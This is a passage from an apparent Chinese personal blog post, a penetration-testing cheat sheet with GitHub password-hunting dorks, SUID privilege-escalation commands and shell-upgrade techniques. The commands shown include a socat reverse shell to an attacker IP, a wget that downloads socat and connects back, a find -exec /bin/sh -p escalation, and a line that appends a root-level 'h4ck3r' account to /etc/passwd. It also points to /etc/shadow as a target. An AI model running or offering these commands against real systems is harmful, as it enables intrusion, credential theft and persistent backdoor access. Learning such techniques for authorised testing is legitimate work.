<li>搜索引擎，基本语法</li>
</ol>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>		<span class="comment"># 强制搜索</span></span><br><span class="line">-		<span class="comment"># 不包含该管检测</span></span><br><span class="line">|		<span class="comment"># 或者</span></span><br><span class="line">site	<span class="comment"># 与这个域名相关</span></span><br><span class="line">intext	<span class="comment"># 正文中包含关键词</span></span><br><span class="line">intitle <span class="comment"># 标题中包含关键词</span></span><br><span class="line">cache	<span class="comment"># 搜索缓存</span></span><br><span class="line"><span class="keyword">define</span>	<span class="comment"># 搜索定义</span></span><br><span class="line">filetype <span class="comment"># 搜索指定文件类型</span></span><br><span class="line">info	<span class="comment"># 查找站点基本信息</span></span><br><span class="line">inurl	<span class="comment"># 包含关键词的URL</span></span><br><span class="line">link	<span class="comment"># 包含链接</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>BBscan </p>
</li>
<li><p>GSIL，搜索Github信息</p>
</li>
<li><p>社交平台（QQ群，文库，求职网），可以通过QQ群文件，在线文档平台等泄露敏感信息</p>
</li>
</ol>
<h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">国内：</span><br><span class="line">http:<span class="regexp">//</span>whatweb.bugscaner.com<span class="regexp">/look/</span></span><br><span class="line">http:<span class="regexp">//yu</span>nsee.cn</span><br><span class="line">http:<span class="regexp">//</span>finger.tidesec.net/</span><br><span class="line">国外：</span><br><span class="line">https:<span class="regexp">//</span>whatcms.org</span><br><span class="line">https:<span class="regexp">//i</span>track.ru<span class="regexp">/whatcms/</span></span><br><span class="line">http:<span class="regexp">//</span>cmsdetect.com/</span><br></pre></td></tr></table></figure>

<p>识别后可以搜索已知漏洞，查找源代码进行审计。</p>
<h3 id="脆弱系统"><a href="#脆弱系统" class="headerlink" title="脆弱系统"></a>脆弱系统</h3><p>通过网络空间搜索引擎进行查询</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">shodan</span></span><br><span class="line"><span class="attribute">fofa</span></span><br><span class="line"><span class="attribute">zoomeye</span></span><br></pre></td></tr></table></figure>

<h3 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h3><p>搜索 github 上的信息</p>
<p>邮件配置：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com smtp</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com smtp @qq.com</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com smtp @<span class="number">126.</span>com</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com smtp @<span class="number">163.</span>com</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com smtp @sina.com.cn</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com smtp password</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com String password smtp</span><br></pre></td></tr></table></figure>

<p>数据库信息：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com sa password</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com root password</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com User ID=’sa’;Password</span><br></pre></td></tr></table></figure>

<p>SVN 信息：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com svn</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com svn username</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com svn password</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com svn username password </span><br></pre></td></tr></table></figure>

<p>数据库备份：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com inurl:sql</span><br></pre></td></tr></table></figure>

<p>其他：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com password</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com ftp ftppassword</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com 密码</span><br><span class="line">site:<span class="module-access"><span class="module"><span class="identifier">Github</span>.</span></span>com 内部</span><br></pre></td></tr></table></figure>

<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>Linux 提权<a target="_blank" rel="noopener" href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">参考</a></p>
<h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/149118.html">SUID提权</a></p>
<p>查找所有SUID可执行文件</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -user root -perm -4000 -<span class="builtin-name">print</span> 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"><span class="builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; </span><br></pre></td></tr></table></figure>

<p>可 SUID 提权的可执行文件：</p>
<ul>
<li><p>Nmap（2.02-5.21）</p>
</li>
<li><p>find</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> . -exec <span class="regexp">/bin/</span>sh -p \; -quit</span><br></pre></td></tr></table></figure></li>
<li><p>vim</p>
</li>
<li><p>bash</p>
</li>
<li><p>less</p>
</li>
<li><p>more</p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">Sudo提权</a></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="升级shell"><a href="#升级shell" class="headerlink" title="升级shell"></a>升级shell</h3><p>参考<a target="_blank" rel="noopener" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method1pythonptymodule">Upgrading Simple Shells to Fully Interactive TTYs</a></p>
<p>升级方法有三：</p>
<ul>
<li><p>使用 python pty 模块</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure></li>
<li><p>使用 socat</p>
<p>攻击者（监听）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> file:`tty`,raw,echo=<span class="number">0</span> tcp-listen:<span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>受害者</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">192.168.3.1:4444</span></span><br></pre></td></tr></table></figure>

<p>若受害者没有安装 socat，可以下载 <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries">Socat - Github</a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https:<span class="regexp">//gi</span>thub.com<span class="regexp">/andrew-d/</span>static-binaries<span class="regexp">/raw/m</span>aster<span class="regexp">/binaries/</span>linux<span class="regexp">/x86_64/</span>socat -O <span class="regexp">/tmp/</span>socat; chmod +x <span class="regexp">/tmp/</span>socat; <span class="regexp">/tmp/</span>socat exec:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="number">192.168</span>.<span class="number">3.1</span>:<span class="number">4444</span></span><br></pre></td></tr></table></figure></li>
<li><p>使用 netcat</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line"><span class="comment"># In Kali</span></span><br><span class="line">$ stty raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="find-命令"><a href="#find-命令" class="headerlink" title="find 命令"></a>find 命令</h3><h3 id="etc-passwd-中添加用户"><a href="#etc-passwd-中添加用户" class="headerlink" title="/etc/passwd 中添加用户"></a>/etc/passwd 中添加用户</h3><table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>用户名</td>
<td></td>
</tr>
<tr>
<td>密码</td>
<td>密文</td>
</tr>
<tr>
<td>UID</td>
<td></td>
</tr>
<tr>
<td>GID</td>
<td>默认组ID</td>
</tr>
<tr>
<td>注释性描述</td>
<td></td>
</tr>
<tr>
<td>宿主目录</td>
<td>登陆后的默认目录</td>
</tr>
<tr>
<td>命令解释器</td>
<td>该用户使用的 shell，默认 bash</td>
</tr>
</tbody></table>
<p>添加新用户</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成密码密文</span></span><br><span class="line">perl -le <span class="string">&#x27;print crypt(&quot;H@ck3dPswd&quot;,&quot;salt&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 写 /etc/passwd</span></span><br><span class="line">echo <span class="string">&quot;h4ck3r:sa5uB0fsSFsiE:0:0:hacker:/root:/bin/bash&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>

<h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/etc/</span>passwd</span><br><span class="line"><span class="regexp">/etc/</span>shadow</span><br><span class="line"><span class="regexp">/etc/</span>apache2/.htpasswd.txt</span><br></pre></td></tr></table></figure>

<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p>john</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>渗透框架</p><p><a href="http://example.com/2020/04/20/pentest/">http://example.com/2020/04/20/pentest/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>lll</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2020-04-20</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2022-09-19</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/pentest/">pentest</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/05/08/vulhub/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">利用 vulhub 搭建漏洞复现环境</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/03/12/crypto/"><span class="level-item">crypto</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="lll"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">lll</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">52</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">29</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1klnd" target="_blank" rel="noopener">关注我</a></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Powershell/"><span class="level-start"><span class="level-item">Powershell</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/metasploit/"><span class="level-start"><span class="level-item">metasploit</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/notes/"><span class="level-start"><span class="level-item">notes</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/vulnhub/"><span class="level-start"><span class="level-item">vulnhub</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-07-12T05:56:35.000Z">2022-07-12</time></p><p class="title"><a href="/2022/07/12/practical-reverse-engineering/">《逆向工程实战》 习题</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-06T08:39:18.000Z">2021-10-06</time></p><p class="title"><a href="/2021/10/06/etw/">A Primer On Event Tracing For Windows (ETW)</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-18T13:39:32.000Z">2021-09-18</time></p><p class="title"><a href="/2021/09/18/PE/">PE 结构</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-08-30T05:59:59.000Z">2021-08-30</time></p><p class="title"><a href="/2021/08/30/struts2/">Struts2 漏洞 S2-001</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-07-22T03:51:23.000Z">2021-07-22</time></p><p class="title"><a href="/2021/07/22/vulhub-debug/">vulhub-debug</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">七月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">六月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">一月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows/"><span class="tag">Windows</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Writeup/"><span class="tag">Writeup</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blackhat/"><span class="tag">blackhat</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cheetsheet/"><span class="tag">cheetsheet</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/cpp/"><span class="tag">cpp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crypto/"><span class="tag">crypto</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/db/"><span class="tag">db</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/dev/"><span class="tag">dev</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/environment/"><span class="tag">environment</span><span class="tag">11</span></a></div><div class="control"><a class="tags has-addons" href="/tags/etw/"><span class="tag">etw</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flask/"><span class="tag">flask</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/git/"><span class="tag">git</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/metasploit/"><span class="tag">metasploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/network/"><span class="tag">network</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/notes/"><span class="tag">notes</span><span class="tag">11</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pentest/"><span class="tag">pentest</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php/"><span class="tag">php</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powershell/"><span class="tag">powershell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/protocol/"><span class="tag">protocol</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/redteam/"><span class="tag">redteam</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse-engineering/"><span class="tag">reverse-engineering</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssr/"><span class="tag">ssr</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vulnhub/"><span class="tag">vulnhub</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">5</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#信息收集"><span class="level-left"><span class="level-item">1</span><span class="level-item">信息收集</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#whois-信息"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">whois 信息</span></span></a></li><li><a class="level is-mobile" href="#子域名"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">子域名</span></span></a></li><li><a class="level is-mobile" href="#备案信息"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">备案信息</span></span></a></li><li><a class="level is-mobile" href="#企业信息"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">企业信息</span></span></a></li><li><a class="level is-mobile" href="#CDN"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">CDN</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#判断"><span class="level-left"><span class="level-item">1.5.1</span><span class="level-item">判断</span></span></a></li><li><a class="level is-mobile" href="#绕过"><span class="level-left"><span class="level-item">1.5.2</span><span class="level-item">绕过</span></span></a></li></ul></li><li><a class="level is-mobile" href="#旁站"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">旁站</span></span></a></li><li><a class="level is-mobile" href="#C段"><span class="level-left"><span class="level-item">1.7</span><span class="level-item">C段</span></span></a></li><li><a class="level is-mobile" href="#邮箱收集"><span class="level-left"><span class="level-item">1.8</span><span class="level-item">邮箱收集</span></span></a></li><li><a class="level is-mobile" href="#端口扫描"><span class="level-left"><span class="level-item">1.9</span><span class="level-item">端口扫描</span></span></a></li><li><a class="level is-mobile" href="#服务器和中间件信息"><span class="level-left"><span class="level-item">1.10</span><span class="level-item">服务器和中间件信息</span></span></a></li><li><a class="level is-mobile" href="#WAF"><span class="level-left"><span class="level-item">1.11</span><span class="level-item">WAF</span></span></a></li><li><a class="level is-mobile" href="#敏感文件、目录扫描"><span class="level-left"><span class="level-item">1.12</span><span class="level-item">敏感文件、目录扫描</span></span></a></li><li><a class="level is-mobile" href="#CMS"><span class="level-left"><span class="level-item">1.13</span><span class="level-item">CMS</span></span></a></li><li><a class="level is-mobile" href="#脆弱系统"><span class="level-left"><span class="level-item">1.14</span><span class="level-item">脆弱系统</span></span></a></li><li><a class="level is-mobile" href="#Github"><span class="level-left"><span class="level-item">1.15</span><span class="level-item">Github</span></span></a></li></ul></li><li><a class="level is-mobile" href="#权限提升"><span class="level-left"><span class="level-item">2</span><span class="level-item">权限提升</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#SUID-提权"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">SUID 提权</span></span></a></li></ul></li><li><a class="level is-mobile" href="#注意事项"><span class="level-left"><span class="level-item">3</span><span class="level-item">注意事项</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#升级shell"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">升级shell</span></span></a></li><li><a class="level is-mobile" href="#find-命令"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">find 命令</span></span></a></li><li><a class="level is-mobile" href="#etc-passwd-中添加用户"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">/etc/passwd 中添加用户</span></span></a></li><li><a class="level is-mobile" href="#敏感文件"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">敏感文件</span></span></a></li><li><a class="level is-mobile" href="#密码爆破"><span class="level-left"><span class="level-item">3.5</span><span class="level-item">密码爆破</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="panic" height="28"></a><p class="is-size-7"><span>&copy; 2022 lll</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
